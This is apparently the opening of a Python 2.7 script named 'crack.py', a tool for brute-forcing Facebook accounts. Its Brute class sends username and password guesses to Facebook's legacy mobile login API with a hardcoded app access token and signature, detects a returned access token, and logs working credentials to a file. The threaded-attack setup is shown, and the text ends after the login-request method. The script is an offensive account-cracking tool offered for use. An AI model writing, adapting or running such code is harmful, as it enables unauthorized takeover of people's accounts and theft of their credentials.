#!usr/bin/python2.7
# coding=utf-8
#!usr/bin/python2.7
# coding
#######################################################
# Name           : DIAMOND  <cookie method>           #
# File           : crack.py                           #
# Author         : Al-hfiz                            #
# Github         : https://github.com/Al-hfiz         #
# Python version : 2.7                                #
#######################################################

import requests, json, sys, os, re
from multiprocessing.pool import ThreadPool as th
from datetime import datetime

class Brute:
	def __init__(self):
		self.setpw = False
		self.ok = []
		self.cp = []
		self.loop = 0

	def bruteRequest(self, username, password):
		params = {
			'access_token': '350685531728%7C62f8ce9f74b12f84c123cc23437a4a32',
			'format': 'JSON',
			'sdk_version': '2',
			'email': username,
			'locale': 'en_US',
			'password': password,
			'sdk': 'ios',
			'generate_session_cookies': '1',
			'sig': '3f555f99fb61fcd7aa0c44f58f522ef6',
		}
		try: os.mkdir('out')
		except: pass
		api = 'https://b-api.facebook.com/method/auth.login'
		response = requests.get(api, params=params)
		if re.search('(EAAA)\w+', response.text):
			self.ok.append(username+'|'+password)
			save = open('out/ok.txt','a')
			save.write(str(username)+'|'+str(password)+'\n')
			save.close()
